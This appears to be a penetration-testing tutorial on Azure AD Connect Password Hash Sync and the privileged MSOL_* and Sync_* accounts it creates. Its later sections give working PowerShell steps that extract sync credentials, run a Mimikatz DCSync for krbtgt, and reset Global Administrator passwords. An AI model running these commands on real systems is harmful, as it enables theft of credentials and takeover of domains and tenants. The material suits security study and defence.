# Azure AD Connect - Hybrid Identity

On-premises AD can be integrated with Azure AD using Azure AD Connect with the following methods. Every method supports Single Sign-on (SSO):

* Password Hash Sync (PHS)
* Pass-Through Authentication (PTA)
* Federation

For each method, at least the user synchronization is done and an account with the name`MSOL_<installationidentifier>` is created on the on-prem AD.

### PHS

* This is the most common method
* Users and a hash of the password hashes are syncronized from the on-prem to AzureAD. However, clear-text passwords or the original hashes aren't sent
* PHS is required for features like Identity Protection and AAD Domain Services.
* Hashes are synchronized every two minutes.
* When an on-prem user wants to access an Azure resource, the authentication takes place on Azure AD.
* Built-in security groups (like domain admins...) are not synced to Azure AD.
* By default, password expiry and account expiry are not sync in Azure AD. So, a user whose on-prem password is expired (not changed) can continue to access Azure resources using the old password.

When PHS is configured some privileged accounts are automatically created:

* The account **`MSOL_<installationID>`** is automatically created in on-prem AD. This account has **replication (DCSync) permissions in the on-prem AD**.
* An account **`Sync_<name of on-prem ADConnect Server>_installationID`** is created in Azure AD. This account can **reset password of ANY user** (synced or cloud only) in Azure AD.

Passwords of the two previous privileged accounts are **stored in SQL server** on the server where **Azure AD Connect is installed.** Admins can extract them in clear-text.

If the server where Azure AD connect is installed is domain joined (recommended in the docs), it's possible to find it with:

```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```

### &#x20;From AzureAD to on-prem

```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```

### From on-prem to AzureAD

Compromising the Sync\_\* account it's possible to reset the password of any user (icluding Global Administrators)

```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)

# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbose
```
